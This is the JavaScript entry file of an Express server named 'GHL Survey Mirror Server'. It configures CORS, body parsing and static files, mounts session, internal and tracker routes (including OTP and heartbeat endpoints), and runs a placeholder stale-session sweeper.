/**
 * GHL Survey Mirror Server
 * ─────────────────────────
 * Entry point — Express app + stale-session sweeper.
 */

require('dotenv').config();

const express = require('express');
const cors    = require('cors');

const sessionRoutes      = require('./routes/session');
const internalRoutes     = require('./routes/internal');
const trackerConfigRoutes = require('./routes/trackerConfig');
const sessionSvc         = require('./services/sessionService');

const app  = express();
const PORT = process.env.PORT || 4000;

// ─── Startup env guard ────────────────────────────────────────────────────────
if (!process.env.SERVER_PUBLIC_URL) {
  if ((process.env.NODE_ENV || '').toLowerCase() === 'production') {
    console.error('');
    console.error('╔══════════════════════════════════════════════════════════════╗');
    console.error('║  ❌  FATAL CONFIG ERROR                                      ║');
    console.error('║  SERVER_PUBLIC_URL is not set in .env                        ║');
    console.error('║  /tracker.js will return an error to the survey page.        ║');
    console.error('║  Add:  SERVER_PUBLIC_URL=https://your-domain.com             ║');
    console.error('║  to your .env file and restart.                              ║');
    console.error('╚══════════════════════════════════════════════════════════════╝');
    console.error('');
  } else {
    console.warn('[server] ⚠️  SERVER_PUBLIC_URL not set — /tracker.js will use localhost fallback (dev-only)');
  }
}

// ─── CORS ─────────────────────────────────────────────────────────────────────

const allowedOrigins = (process.env.CORS_ALLOWED_ORIGINS || '')
  .split(',')
  .map((o) => o.trim())
  .filter(Boolean);

app.use(
  cors({
    origin: (origin, callback) => {
      // Allow requests with no origin (server-to-server, curl, Postman)
      if (!origin) return callback(null, true);
      if (allowedOrigins.length === 0 || allowedOrigins.includes(origin)) {
        return callback(null, true);
      }
      return callback(new Error(`CORS: origin ${origin} not allowed`));
    },
    methods:     ['GET', 'POST', 'OPTIONS'],
    credentials: true,
  }),
);

// ─── Body parser ──────────────────────────────────────────────────────────────

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// ─── Static (serves public/survey-tracker.js etc.) ───────────────────────────

app.use(express.static('public'));

// ─── Routes ───────────────────────────────────────────────────────────────────

// Tracker config + tracker.js bundle endpoint
app.use('/', trackerConfigRoutes);

// Survey client → our server
app.use('/api/session', sessionRoutes);

// Other server → our server (protected by INTERNAL_API_SECRET)
app.use('/api/internal', internalRoutes);

// Health check
app.get('/health', (req, res) => {
  res.json({
    status:  'ok',
    service: 'ghl-survey-mirror',
    time:    new Date().toISOString(),
  });
});

// ─── Stale-session sweeper ────────────────────────────────────────────────────
// Every 5 minutes, any active session whose lastHeartbeat is older than
// STALE_SESSION_MINUTES is written back to DynamoDB as 'exited'.
//
// NOTE: Because DynamoDB scans across all items would be expensive at scale,
// we rely primarily on the per-request stale check in GET /api/session/:id.
// This sweeper is an additional safety net that runs on startup + every 5 min.
// For high-volume production, replace with a DynamoDB Streams Lambda.

const SWEEP_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes

async function sweepStaleSessions() {
  // We don't do a full table scan here; stale detection is per-request.
  // This function is a placeholder for future Lambda-based sweeping.
  // Left intentionally minimal to avoid costly scans.
  console.log('[sweeper] Stale-session check tick (per-request detection is primary)');
}

setInterval(sweepStaleSessions, SWEEP_INTERVAL_MS);

// ─── Start ────────────────────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log('');
  console.log('╔══════════════════════════════════════════════════╗');
  console.log('║   GHL Survey Mirror Server                       ║');
  console.log(`║   Listening on port ${String(PORT).padEnd(28)}║`);
  console.log(`║   ENV: ${String(process.env.NODE_ENV || 'development').padEnd(41)}║`);
  console.log(`║   Table: ${String(process.env.DYNAMODB_SESSIONS_TABLE || 'Survey-MirrorSessions').padEnd(39)}║`);
  console.log('╚══════════════════════════════════════════════════╝');
  console.log('');
  console.log('  Routes:');
  console.log('    POST /api/session/init         — initiate session');
  console.log('    POST /api/session/slide-data   — save slide data');
  console.log('    POST /api/session/heartbeat    — heartbeat');
  console.log('    POST /api/session/exit         — mark exited');
  console.log('    POST /api/session/otp-submit   — submit OTP');
  console.log('    GET  /api/session/:id          — read session');
  console.log('    GET  /api/session/:id/otp-status — poll OTP');
  console.log('');
  console.log('  Internal (other server):');
  console.log('    GET  /api/internal/session/:id');
  console.log('    GET  /api/internal/session/by-email/:email');
  console.log('    POST /api/internal/session/:id/otp-status');
  console.log('    POST /api/internal/session/:id/otp-trigger');
  console.log('    POST /api/internal/session/:id/plan');
  console.log('');
  console.log('  Tracker:');
  console.log('    GET  /tracker-config           — slide field map');
  console.log('    GET  /tracker.js               — client script');
  console.log('    GET  /health                   — health check');
  console.log('');
});

module.exports = app;
